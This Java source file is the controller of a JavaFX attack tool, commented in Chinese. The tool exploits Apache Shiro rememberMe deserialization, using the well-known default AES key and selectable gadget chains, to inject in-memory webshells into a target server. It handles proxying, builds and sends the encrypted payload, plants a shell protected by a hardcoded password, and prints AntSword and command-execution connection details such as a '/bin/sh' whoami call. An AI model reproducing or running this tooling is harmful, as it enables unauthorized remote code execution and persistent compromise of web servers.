package sample;

import org.apache.commons.lang.StringUtils;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.ChoiceBox;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import sample.deser.plugins.servlet.MemBytes;
import sample.deser.util.Gadgets;
import sample.exp.DserUtil;
import sample.utils.Console;

import java.io.PrintStream;
import java.net.URL;
import java.util.Properties;

public class Controller {
    private PrintStream printStream;
    Properties prop;
    @FXML
    private TextArea run_result;
    @FXML
    private TextArea UpdateText;

    @FXML
    private TextField Web_Url;
    @FXML
    private TextField Shiro_Key;
    @FXML
    private TextField Web_Path;
    @FXML
    private TextField proxy_text;

    public void initialize() {
        System.setProperty("com.mchange.v2.log.MLog", "com.mchange.v2.log.FallbackMLog");
        System.setProperty("com.mchange.v2.log.FallbackMLog.DEFAULT_CUTOFF_LEVEL", "WARNING");

        // 默认打开程序第一页为反序列化页面
        printStream = new PrintStream(new Console(run_result), true);
        System.setOut(printStream);
        System.setErr(printStream);

        // 更新日志
        UpdateText.appendText("更新记录:\n");
        UpdateText.appendText("1. 新增调用链\n");
        UpdateText.appendText("2. 新增全局代理\n");
        UpdateText.appendText("3. 新增WEBSHELL\n");
        // 结果显示
        run_result.appendText("注意web路径不能过长,可能注入失败,也可能已经存在该路径！！！\n");
        run_result.appendText("URL及连接方式和密码将会在这里显示！！！！\n");

        // 其他组件
        Web_Url.setText("http://192.168.1.1:8080");
        Shiro_Key.setText("kPH+bIxk5D2deZiIxcaaaA==");
        Web_Path.setText("/cc");
        proxy_text.setText("[http|socks]:192.168.1.1:8080");
    }

    @FXML
    private ChoiceBox<String> memshell_type;
    @FXML
    private ChoiceBox<String> gadget_type;

    @FXML
    void Run_Inject_Mem(ActionEvent event) throws Exception {
        String web_url = Web_Url.getText().trim();
        String web_path = Web_Path.getText().trim();
        String shiro_key = Shiro_Key.getText().trim();
        String memshell_type_1 = memshell_type.getValue().trim();
        String gadget_type_1 = gadget_type.getValue().trim();
        String injectPass = "Passw0rd123";
        String framename = "Shiro";
        String proxy=proxy_text.getText().trim();
        String proxy_info[]=proxy.split(":");

        if(proxy_info[0].equals("http")){
            prop = System.getProperties();
            prop.put("proxySet", true);
            // HTTP代理的IP设置
            prop.setProperty("http.proxyHost", proxy_info[1]);
            // HTTP代理的端口设置
            prop.setProperty("http.proxyPort", proxy_info[2]);
        }else if(proxy_info[0].equals("socks")){
            prop = System.getProperties();
            prop.put("proxySet", true);
            // socks代理服务器的地址与端口
            prop.setProperty("socksProxyHost", proxy_info[1]);
            prop.setProperty("socksProxyPort", proxy_info[2]);
        }

        if (StringUtils.isBlank(web_url) || StringUtils.isBlank(web_path) || StringUtils.isBlank(shiro_key) ||
                StringUtils.isBlank(memshell_type_1) || StringUtils.isBlank(gadget_type_1)) {
            run_result.appendText("[-] 请检查参数是否为空！！！\n");
        } else {
            String url_flag = "";
            if (web_url.endsWith("/")) {
                url_flag = "";
            } else {
                url_flag = "/";
            }

            run_result.appendText("[+] 正在检测URL: " + web_url + url_flag + web_path.replace("/", "") + "\n");
            run_result.appendText("[+] 正在获取WEBSHELL: " + memshell_type_1 + "\n");
            String b64Bytecode = MemBytes.getBytes(memshell_type_1);
            run_result.appendText("[+] 正在初始化Gadget: " + gadget_type_1 + "\n");
            DserUtil.init_gen(gadget_type_1, framename);
            // 为了解析web传递的参数
            Object template = Gadgets.createTemplatesImpl("InjectMemTool");
            // 添加到调用链中
            Object chainObject = DserUtil.gadgetpayload.getObject(template);
            //  Aes加密->加密chainObject和shiro_key->Base64加密->生成rememberMe
            String rememberMe = DserUtil.genpayload.sendpayload(chainObject, shiro_key);
            /*
             * web_url: 目标URL
             * rememberMe: 发送的payload
             * b64Bytecode: webshell内存马
             * web_path: 目标URL路径
             * injectPass: 注入的密码【默认为Passw0rd123】
             * timeout: 超时时间
             * */
            String result = DserUtil.execInject(web_url, rememberMe, b64Bytecode, web_path, injectPass, 10);

            run_result.appendText("[+] 正在检查WEBSHELL: " + web_url + url_flag + web_path.replace("/", "") + "\n");
            if (result != null && result.contains("dynamic inject success")) {
                URL url = new URL(web_url);
                int port;
                if (url.getPort() == -1) {
                    port = url.getDefaultPort();
                } else {
                    port = url.getPort();
                }
                String domain = url.getProtocol() + "://" + url.getHost() + ":" + port;

                run_result.appendText("\n-------------------\n");
                run_result.appendText("注入成功请访问验证,如404则尝试拼接原有根目录:\n");
                run_result.appendText(domain + web_path + '\n');
                if (memshell_type_1.contains("蚁剑")) {
                    run_result.appendText("\n");
                    run_result.appendText("ps: 蚁剑马->CUSTOM类型->请求返回均hex编码 (最新版)\n");
                    run_result.appendText("URL->" + web_url + url_flag + web_path.replace("/", "") + "\n");
                    run_result.appendText("Password->" + injectPass + "\n\n");
                }else if(memshell_type_1.contains("BURP_CMD")){
                    run_result.appendText("\n");
                    run_result.appendText("ps: BURP 命令执行\n");
                    run_result.appendText("POST URL:"+domain + web_path + '\n');
                    run_result.appendText("Args: cmd=/bin/sh&cmdargs=whoami"+'\n');
                    run_result.appendText("\n");
                }
                else {
                    run_result.appendText("\n");
                    run_result.appendText("ps: 马儿默认配置\n\n");
                }
                run_result.appendText("-------------------\n");
            } else {
                run_result.appendText("\n-------------------\n");
                run_result.appendText("注入失败，请尝试更换目录(寻找网站已存在的资源目录)或使用其他内存马测试。\n");
                run_result.appendText("-------------------\n\n");
            }

        }
    }

    @FXML
    void Clear_test(ActionEvent event) throws Exception {
        run_result.clear();
    }
}
